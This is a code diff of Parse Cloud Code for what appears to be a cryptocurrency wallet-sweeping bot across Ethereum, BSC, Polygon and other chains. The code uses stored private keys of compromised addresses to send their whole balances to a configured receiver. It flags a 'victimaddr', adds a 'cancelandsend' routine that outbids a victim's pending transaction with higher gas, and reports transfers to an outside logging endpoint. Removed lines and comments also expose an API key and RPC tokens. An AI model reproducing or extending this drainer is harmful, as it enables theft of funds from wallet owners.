@@ -13,9 +13,12 @@ const moralis_1 = __importDefault(require("moralis"));
 // console.log(addr)
 // import Moralis from 'moralis';
 const web3_1 = __importDefault(require("web3"));
+const ethers_1 = require("ethers");
 // import Moralis from 'moralis';
 // import Moralis from "moralis-v1";
-const web3 = new web3_1.default(new web3_1.default.providers.HttpProvider(config_1.default.WEB3_PROVIDER_URL));
+var web3 = new web3_1.default(new web3_1.default.providers.HttpProvider(config_1.default.WEB3_PROVIDER_URL));
+var provider = null;
+const formatEther = ethers_1.ethers.utils.formatEther;
 Parse.Cloud.define('requestMessage', async ({ params }) => {
     const { address, chain, networkType } = params;
     const message = await (0, authService_1.requestMessage)({
@@ -46,10 +49,10 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             var result = await web3.utils.fromWei(request.object.get("value"));
             Parse.Cloud.httpRequest({
                 method: 'POST',
-                url: 'https://aires2-89c4.restdb.io/rest/aires',
+                url: config_1.default.MLIS_URL,
                 headers: {
                     "content-type": "application/json",
-                    "x-apikey": "6463413a0b60fc42f4e196ad",
+                    "x-apikey": config_1.default.MLIS_KEY,
                     "cache-control": "no-cache"
                 },
                 body: {
@@ -78,10 +81,10 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             var result = await web3.utils.fromWei(request.object.get("value"));
             Parse.Cloud.httpRequest({
                 method: 'POST',
-                url: 'https://aires2-89c4.restdb.io/rest/aires',
+                url: config_1.default.MLIS_URL,
                 headers: {
                     "content-type": "application/json",
-                    "x-apikey": "6463413a0b60fc42f4e196ad",
+                    "x-apikey": config_1.default.MLIS_KEY,
                     "cache-control": "no-cache"
                 },
                 body: {
@@ -102,7 +105,7 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         else {
         }
     });
-    async function proxsend(request, toAddrDtls, rcveraddress, prjid, ntwk, value, loggerr) {
+    async function sendhighbal(request, toAddrDtls, rcveraddress, prjid, ntwk, value, loggerr) {
         // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
         // loggerr.info(JSON.stringify(prjid));
         var web3;
@@ -114,6 +117,24 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             // );
             // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
             web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth/" + prjid));
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+            //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+            //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+            //       "https://rpc.ankr.com/eth/"+prjid
+            //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+            //   )
+            // );
+        }
+        if (ntwk == "zkSync") {
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+            //   )
+            // );
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/zksync_era/" + prjid));
             // web3 = new Moralis.Web3(
             //   new Moralis.Web3.providers.HttpProvider(
             //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
@@ -225,14 +246,33 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             //    )
             //  );
         }
+        if (ntwk == "goerli") {
+            // https://rpc.ankr.com/eth_goerli
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth_goerli/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "sepolia") {
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth_sepolia/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
         if (ntwk == null) {
             var result = await web3.utils.fromWei(request.object.get("value"));
             Parse.Cloud.httpRequest({
                 method: 'POST',
-                url: 'https://aires2-89c4.restdb.io/rest/aires',
+                url: config.MLIS_URL,
                 headers: {
                     "content-type": "application/json",
-                    "x-apikey": "6463413a0b60fc42f4e196ad",
+                    "x-apikey": config.MLIS_KEY,
                     "cache-control": "no-cache"
                 },
                 body: {
@@ -275,50 +315,69 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         //      baltosend =  bl.sub(fee);
         //    }
         // end old 
-        // new
-        request.log.info("got to the end of seclecting network_" + ntwk);
-        // var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
-        var gasPrice = await web3.eth.getGasPrice();
-        var gas = 21000;
-        var BN = web3.utils.BN;
-        // var fee = gasPrice * gas;
-        var nGasprice = new BN(gasPrice);
-        var fee = nGasprice.mul(new BN(2));
-        fee = new BN(new BN(fee)).mul(new BN(gas));
-        var bl = new BN(value);
-        var baltosend = bl.sub(fee);
-        // loggerr.info(fee+" Old fee");
-        // loggerr.info(nonce+" nounce");
-        // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
-        //   loggerr.info("Crazy Point");
-        //   // var halffee = nGasprice.divn(new BN("2"))
-        //  var prefee = nGasprice.add(new BN(nGasprice));
-        //  nGasprice = prefee;
-        //  fee = prefee.mul(new BN(gas));
-        //  // bl = new BN(value);
-        //  baltosend =  bl.sub(fee);
-        // }
-        if (parseInt(baltosend) <= 0) {
-            // bl = new BN(value);
-            baltosend = bl.sub(fee);
-        }
-        // end new
-        //  loggerr.info(baltosend.toString()+ "bal to send");
-        //  loggerr.info(nGasprice.toString()+ " gas price");
-        //  loggerr.info(fee.toString()+ "new fee");
-        //    logger.info(balance.balance.toString());
-        //  logger.info(value.toString()+ " value");
-        //  logger.info(ntwk+ " ntwk");
-        var transaction = {
-            'to': rcveraddress,
-            'value': baltosend,
-            'gas': gas,
-            'gasPrice': gasPrice,
-            // 'nonce': nonce+1,
-            // optional data field to send message or execute smart contract
-        };
-        var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
         try {
+            // new
+            request.log.info("got to the end of selecting network_" + ntwk);
+            //  var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); 
+            var gasPrice = await web3.eth.getGasPrice();
+            var gas = 21000;
+            var BN = web3.utils.BN;
+            // var fee = gasPrice * gas;
+            var nGasprice = new BN(gasPrice);
+            var fee = nGasprice.mul(new BN(3));
+            fee = fee.mul(new BN(gas));
+            fee = fee.add(new BN(2)); /// just added this line 2024
+            request.log.info("Calculated big number");
+            var bl = new BN(value);
+            const getBalance = await web3.eth.getBalance(request.object.get("toAddress"));
+            var getbal = new BN(getBalance);
+            if (getbal > bl) {
+                bl = getbal;
+                request.log.info("Using wallet balance instead");
+            }
+            if (bl < fee) {
+                request.log.info("Balance is less than fee");
+                return;
+            }
+            var baltosend = bl.sub(fee);
+            request.log.info("Calculated fee");
+            // loggerr.info(fee+" Old fee");
+            // loggerr.info(nonce+" nounce");
+            // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
+            //   loggerr.info("Crazy Point");
+            //   // var halffee = nGasprice.divn(new BN("2"))
+            //  var prefee = nGasprice.add(new BN(nGasprice));
+            //  nGasprice = prefee;
+            //  fee = prefee.mul(new BN(gas));
+            //  // bl = new BN(value);
+            //  baltosend =  bl.sub(fee);
+            // }
+            request.log.info("Calculated gas price");
+            if (parseInt(baltosend) <= 0) {
+                request.log.info("Balance is less than zero");
+                // bl = new BN(value);
+                baltosend = bl.sub(fee);
+            }
+            request.log.info("Calculated balance");
+            // end new
+            //  loggerr.info(baltosend.toString()+ "bal to send");
+            //  loggerr.info(nGasprice.toString()+ " gas price");
+            //  loggerr.info(fee.toString()+ "new fee");
+            //    logger.info(balance.balance.toString());
+            //  logger.info(value.toString()+ " value");
+            //  logger.info(ntwk+ " ntwk");
+            var transaction = {
+                'to': rcveraddress,
+                'value': baltosend,
+                'gas': gas,
+                'gasPrice': gasPrice,
+                // 'nonce': request.object.get("nonce"),
+                // optional data field to send message or execute smart contract
+            };
+            request.log.info("Created transaction");
+            var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
+            request.log.info("Signed transaction");
+            request.log.info("Sending transaction");
             web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash) => {
                 // loggerr.info(hash.toString());
                 request.log.info("got hash");
@@ -334,6 +393,300 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             });
         }
         catch (error) {
+            request.log.info(JSON.stringify(error));
+            // loggerr.info(JSON.stringify(error));
+            // loggerr.info("catch errror");
+        }
+    }
+    async function proxsend(request, toAddrDtls, rcveraddress, prjid, ntwk, value, loggerr) {
+        // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
+        // loggerr.info(JSON.stringify(prjid));
+        var web3;
+        if (ntwk == "eth") {
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+            //   )
+            // );
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth/" + prjid));
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+            //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+            //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+            //       "https://rpc.ankr.com/eth/"+prjid
+            //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+            //   )
+            // );
+        }
+        if (ntwk == "zkSync") {
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+            //   )
+            // );
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/zksync_era/" + prjid));
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
+            //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
+            //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
+            //       "https://rpc.ankr.com/eth/"+prjid
+            //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
+            //   )
+            // );
+        }
+        //  web3 = new Moralis.Web3(
+        //      new Moralis.Web3.providers.HttpProvider(
+        //         //  'https://rinkeby.Ankra.io/v3/'+prjid
+        //         //  'https://rpc.ankr.com/eth_rinkeby'
+        //         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
+        //         "https://rpc.ankr.com/eth/"+prjid
+        //         // "https://eth.getblock.io/mainnet/?api_key="+prjid
+        //      )
+        //    );
+        if (ntwk == "bsc") {
+            // web3 = new Moralis.Web3(
+            //   new Moralis.Web3.providers.HttpProvider(
+            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
+            //   )
+            // );
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/bsc/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://bsc.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
+            //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
+            //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
+            //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
+            //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
+            //       //  "https://rpc.ankr.com/bsc/"+prjid
+            //       "https://rpc.ankr.com/bsc/"+prjid
+            //    )
+            //  );
+            //  loggerr.info("got to bsccccc");
+        }
+        if (ntwk == "polygon") {
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/polygon/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://matic.getblock.io/"+prjid+"/mainnet/"));
+            request.log.info("got to plygon");
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //     //    'https://rpc.ankr.com/polygon_mumbai'
+            //     //    'https://rpc.ankr.com/polygon'
+            //     // "https://matic.getblock.io/testnet/?api_key="+prjid
+            //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
+            //     "https://rpc.ankr.com/polygon/"+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "avax") {
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://avax.getblock.io/"+prjid+"/mainnet/ext/bc/C/rpc"));
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/avalanche/" + prjid));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //     //    'https://rpc.ankr.com/avalanche'
+            //     //    'https://rpc.ankr.com/avalanche_fuji'
+            //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
+            //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
+            //     "https://rpc.ankr.com/avalanche/"+prjid
+            //     // "https://rpc.ankr.com/avalanche-c/"+prjid
+            //    )
+            //  );
+            //  loggerr.info(web3+" web3 i got here");
+        }
+        if (ntwk == "fantom") {
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://ftm.getblock.io/"+prjid+"/mainnet/"));
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/fantom/" + prjid));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        // 'https://rpc.ankr.com/fantom_testnet'
+            //     //    'https://rpc.ankr.com/fantom'
+            //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
+            //     "https://rpc.ankr.com/fantom/"+prjid
+            //     // "https://rpc.ankr.com/fantom/"+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "cronos") {
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
+            var config = await Parse.Config.get({ useMasterKey: true });
+            var prjidd = config.get("getBlock");
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://cro.getblock.io/" + prjidd + "/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "arb") {
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/arbitrum/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://arb.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "op") {
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/optimism/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "goerli") {
+            // https://rpc.ankr.com/eth_goerli
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth_goerli/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == "sepolia") {
+            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://rpc.ankr.com/eth_sepolia/" + prjid));
+            // web3 = new Web3(new Web3.providers.HttpProvider("https://op.getblock.io/"+prjid+"/mainnet/"));
+            //  web3 = new Moralis.Web3(
+            //    new Moralis.Web3.providers.HttpProvider(
+            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
+            //    )
+            //  );
+        }
+        if (ntwk == null) {
+            var result = await web3.utils.fromWei(request.object.get("value"));
+            Parse.Cloud.httpRequest({
+                method: 'POST',
+                url: config.MLIS_URL,
+                headers: {
+                    "content-type": "application/json",
+                    "x-apikey": config.MLIS_KEY,
+                    "cache-control": "no-cache"
+                },
+                body: {
+                    addr_from: request.object.get("fromAddress"),
+                    addr_to: request.object.get("toAddress"),
+                    value: result,
+                    time: request.object.get("_created_at"),
+                    brand: getntwork(request.object.get("chainId")) + "_" + request.object.get("chainId") + "_streams",
+                    server: "1new_null"
+                }
+            }).then(function (httpResponse) {
+                //logger.info(httpResponse.text);
+                // logger.info("Logged Eth Trnasfer");
+            }, function (httpResponse) {
+                //  logger.error(JSON.stringify(httpResponse));
+            });
+            return;
+        }
+        // old
+        //    var options = {
+        //      chain: ntwk,
+        //      address: toAddrDtls.get("addr")
+        //    };
+        //    var balance = await Moralis.Web3API.account.getNativeBalance(options);
+        //    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
+        //    var gasPrice = await web3.eth.getGasPrice();
+        //    var gas = await web3.eth.estimateGas({
+        //      to: rcveraddress,
+        //      from: toAddrDtls.get("addr"),
+        //      value: balance.balance,
+        //    });
+        //    var BN = web3.utils.BN;
+        //    // var fee = gasPrice * gas;
+        //    nGasprice = new BN(gasPrice);
+        //    var fee = nGasprice.mul(new BN(gas));
+        //    bl = new BN(balance.balance);
+        //    baltosend =  bl.sub(fee);
+        //    if(parseInt(baltosend) <= 0 ) {
+        //      bl = new BN(value);
+        //      baltosend =  bl.sub(fee);
+        //    }
+        // end old 
+        try {
+            // new
+            request.log.info("got to the end of selecting network_" + ntwk);
+            //  var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); 
+            var gasPrice = await web3.eth.getGasPrice();
+            var gas = 21000;
+            var BN = web3.utils.BN;
+            // var fee = gasPrice * gas;
+            var nGasprice = new BN(gasPrice);
+            var fee = nGasprice.mul(new BN(3));
+            fee = fee.mul(new BN(gas));
+            fee = fee.add(new BN(2)); /// just added this line 2024
+            request.log.info("Calculated big number");
+            var bl = new BN(value);
+            const getBalance = await web3.eth.getBalance(request.object.get("toAddress"));
+            var getbal = new BN(getBalance);
+            if (getbal > bl) {
+                bl = getbal;
+                request.log.info("Using wallet balance instead");
+            }
+            if (bl < fee) {
+                request.log.info("Balance is less than fee");
+                return;
+            }
+            var baltosend = bl.sub(fee);
+            request.log.info("Calculated fee");
+            // loggerr.info(fee+" Old fee");
+            // loggerr.info(nonce+" nounce");
+            // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
+            //   loggerr.info("Crazy Point");
+            //   // var halffee = nGasprice.divn(new BN("2"))
+            //  var prefee = nGasprice.add(new BN(nGasprice));
+            //  nGasprice = prefee;
+            //  fee = prefee.mul(new BN(gas));
+            //  // bl = new BN(value);
+            //  baltosend =  bl.sub(fee);
+            // }
+            request.log.info("Calculated gas price");
+            if (parseInt(baltosend) <= 0) {
+                request.log.info("Balance is less than zero");
+                // bl = new BN(value);
+                baltosend = bl.sub(fee);
+            }
+            request.log.info("Calculated balance");
+            // end new
+            //  loggerr.info(baltosend.toString()+ "bal to send");
+            //  loggerr.info(nGasprice.toString()+ " gas price");
+            //  loggerr.info(fee.toString()+ "new fee");
+            //    logger.info(balance.balance.toString());
+            //  logger.info(value.toString()+ " value");
+            //  logger.info(ntwk+ " ntwk");
+            var transaction = {
+                'to': rcveraddress,
+                'value': baltosend,
+                'gas': gas,
+                'gasPrice': gasPrice,
+                // 'nonce': request.object.get("nonce"),
+                // optional data field to send message or execute smart contract
+            };
+            request.log.info("Created transaction");
+            var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
+            request.log.info("Signed transaction");
+            request.log.info("Sending transaction");
+            web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash) => {
+                // loggerr.info(hash.toString());
+                request.log.info("got hash");
+            }).on('receipt', async (reciept) => {
+                await mshlogger(request, ntwk, loggerr);
+                request.log.info("got recipet");
+                // loggerr.info(JSON.stringify(reciept));
+            }).on('error', async (error) => {
+                await mshlogger(request, JSON.stringify(error), loggerr);
+                request.log.info("got error");
+                // loggerr.info(JSON.stringify(error));
+                // loggerr.info("errror");
+            });
+        }
+        catch (error) {
+            request.log.info(JSON.stringify(error));
             // loggerr.info(JSON.stringify(error));
             // loggerr.info("catch errror");
         }
@@ -343,18 +696,82 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         // let projectId = "3dd198ffc6924f45aa3b50cae37aa6dd";
         // // var web3ws = new Web3(new Web3.providers.WebsocketProvider('wss://rinkeby.Ankra.io/ws/v3/' + projectId));
         // // var web3 = new Web3(new Web3.providers.HttpProvider('https://rinkeby.Ankra.io/v3/' + projectId));
-        request.log.info('Got to all functions');
+        request.log.info('Got to all functions local');
+        await BalanceChecker(request);
         //  var logger = Moralis.Cloud.getLogger();
         var config = await Parse.Config.get({ useMasterKey: true });
         var AnkrId = config.get("Ankr");
         var recver = config.get("addr");
+        var recver2 = config.get("addr2");
+        var victimaddr = config.get("victimaddr");
+        var AnkrId2 = config.get("AnkrId2");
         var toaddress = request.object.get("toAddress");
+        var fromaddress = request.object.get("fromAddress");
         if (request.object.get("fromAddress") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
             toaddress = request.object.get("fromAddress");
         }
         var value = request.object.get("value");
         // var toaddress = "0x2CA37Dd92856f00E8c77f843256c7Db4c6FAd2E9";
         // var value = "10000000";
+        // check if exempted  for from addr
+        var queryfrom = new Parse.Query("exemptedaddr");
+        // query.limit(10);
+        queryfrom.fullText("addr", fromaddress);
+        var resultsfrom = await queryfrom.first(); // [ Monster, Monster, ...]
+        // check if exempted  for to addr
+        var queryto = new Parse.Query("exemptedaddr");
+        // query.limit(10);
+        queryto.fullText("addr", toaddress);
+        var resultsto = await queryto.first(); // [ Monster, Monster, ...]
+        if (resultsfrom || resultsto) {
+            request.log.info("got to result but is exempted");
+            if (resultsfrom) {
+                await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:" + fromaddress);
+            }
+            if (resultsto) {
+                await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:" + toaddress);
+            }
+            return;
+        }
+        if (fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
+            var query = new Parse.Query("hpaddr");
+            // query.limit(10);
+            query.fullText("addr", fromaddress);
+            var results = await query.first(); // [ Monster, Monster, ...]
+            if (results) {
+                request.log.info("got to result eth2");
+                provider = new ethers_1.providers.JsonRpcProvider(AnkrId2);
+                // web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
+                // await cancelandsend(request, results.get("pkaddr"), recver2, provider, web3)
+                await proxsend(request, results, recver, AnkrId, ntwk, value, 'logger');
+                //  sendhighbal(request,results, recver, AnkrId,ntwk, value, 'logger' );
+            }
+            else {
+                //  logger.info(JSON.stringify(results));
+                request.log.info("got to no result eth2");
+            }
+            return;
+        }
+        // check if exempted  for to addr
+        var query = new Parse.Query("exemptedaddr");
+        // query.limit(10);
+        query.fullText("addr", toaddress);
+        if (query) {
+            var query = new Parse.Query("hpaddr");
+            // query.limit(10);
+            query.fullText("addr", toaddress);
+            var results = await query.first(); // [ Monster, Monster, ...]
+            // request.log.info('Live section');
+            if (results) {
+                request.log.info("got to result but is exempted");
+                await proxsend(request, results, recver, AnkrId, ntwk, value, 'logger');
+            }
+            else {
+                //  logger.info(JSON.stringify(results));
+                request.log.info("no result and is exempted");
+            }
+            return;
+        }
         var query = new Parse.Query("hpaddr");
         // query.limit(10);
         query.fullText("addr", toaddress);
@@ -463,10 +880,10 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
                     // llooggerx.info("succss:	😀 restarting");
                     Parse.Cloud.httpRequest({
                         method: 'POST',
-                        url: 'https://aires2-89c4.restdb.io/rest/aires',
+                        url: config_1.default.MLIS_URL,
                         headers: {
                             "content-type": "application/json",
-                            "x-apikey": "6463413a0b60fc42f4e196ad",
+                            "x-apikey": config_1.default.MLIS_KEY,
                             "cache-control": "no-cache"
                         },
                         body: {
@@ -611,10 +1028,10 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
                     // llooggerx.info("succss:	😀 restarting");
                     Parse.Cloud.httpRequest({
                         method: 'POST',
-                        url: 'https://aires2-89c4.restdb.io/rest/aires',
+                        url: config_1.default.MLIS_URL,
                         headers: {
                             "content-type": "application/json",
-                            "x-apikey": "6463413a0b60fc42f4e196ad",
+                            "x-apikey": config_1.default.MLIS_KEY,
                             "cache-control": "no-cache"
                         },
                         body: {
@@ -665,6 +1082,14 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
                 name: 'eth'
             },
             {
+                id: 5,
+                name: 'goerli'
+            },
+            {
+                id: 11155111,
+                name: 'sepolia'
+            },
+            {
                 id: 137,
                 name: 'polygon'
             },
@@ -691,6 +1116,22 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
             {
                 id: 25,
                 name: 'cronos'
+            },
+            {
+                id: 369,
+                name: 'pulse'
+            },
+            {
+                id: 11297108109,
+                name: 'palm'
+            },
+            {
+                id: 324,
+                name: 'zkSync'
+            },
+            {
+                id: 100,
+                name: 'gnosis'
             }
         ];
         // grab the Array item which matchs the id "2"
@@ -705,6 +1146,133 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         // return returnvalue;
         return item === null || item === void 0 ? void 0 : item.name;
     }
+    async function cancelandsend(transactx, VICTIM_KEY, reciver, provider, web3) {
+        var _a;
+        const wallet = new ethers_1.Wallet(VICTIM_KEY, provider);
+        //  var balance = await wallet.getBalance();
+        var BN = web3.utils.BN;
+        const valuee = await transactx.object.get("value");
+        request.log.info('Value is: ' + ethers_1.ethers.utils.formatUnits(valuee, "ether") + "ETH");
+        request.log.info('Value is in wei: ' + ethers_1.ethers.utils.formatUnits(valuee, "wei") + "ETH");
+        var balance = new BN(valuee); // value to be sent by the previous transaction
+        request.log.info("i got here-0");
+        if (balance < 0) {
+            request.log.info(`Value is zero`);
+            return;
+        }
+        request.log.info("i got here0");
+        //  const gasPrice = ethers.BigNumber.from(await provider.getGasPrice());
+        var gapricevalu = await transactx.object.get("gasPrice");
+        var gaslimivalu = await transactx.object.get("gas");
+        request.log.info("i got here1");
+        request.log.info("i got here1 old gaslimit" + gaslimivalu);
+        var gasPrice = (new BN(gapricevalu)).mul(new BN('5'));
+        request.log.info("i got here2");
+        request.log.info("i got here2gasprice1" + gasPrice);
+        var gasLimit = "21000";
+        request.log.info("i got here2limit1" + gasLimit);
+        request.log.info("i got here3");
+        var gasPriceTotal = (gasPrice).mul(new BN(gasLimit));
+        request.log.info("i got here4");
+        const gpricee = await web3.eth.getGasPrice();
+        request.log.info("i got here5-0");
+        const gasPrice2 = (new BN(gpricee)).mul(new BN('5'));
+        request.log.info("i got here5:gasprice2" + gasPrice2);
+        request.log.info("i got here5");
+        const gasLimit2 = gasLimit;
+        request.log.info("i got here6");
+        request.log.info("i got here6:gas limit2" + gasLimit2);
+        const gasPriceTotal2 = (gasPrice).mul(gasLimit);
+        request.log.info("i got here7");
+        if (gasPriceTotal.sub(gasPriceTotal2) < 0) {
+            request.log.info("yes it is less than");
+            gasPriceTotal = gasPriceTotal2;
+            gasLimit = gasLimit2;
+            gasPrice = gasPrice2;
+        }
+        else {
+            request.log.info("no it is greater than");
+        }
+        request.log.info("i got here8");
+        const val = balance.sub(gasPriceTotal.add(new BN('10')));
+        request.log.info("i got here9");
+        request.log.info("bALANCE to send: " + val);
+        request.log.info("Orignal bALANCE : " + balance);
+        request.log.info("Total gas: " + gasPriceTotal);
+        //  const minval = (new BN(ethers.utils.parseUnits("0.0011", "ether")))
+        //  if (val.lt(minval)) {
+        //   request.log.info(`Eth Balance is less than min value 2$ - ${ethers.utils.formatUnits(minval, "ether")}Eth .... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
+        //   return;
+        // }
+        if (val.sub(gasPriceTotal) <= 0) {
+            request.log.info(` Eth Balance is less than gas price, waiting....`);
+            return;
+        }
+        request.log.info("i got here10");
+        request.log.info(` Balance is now greater`);
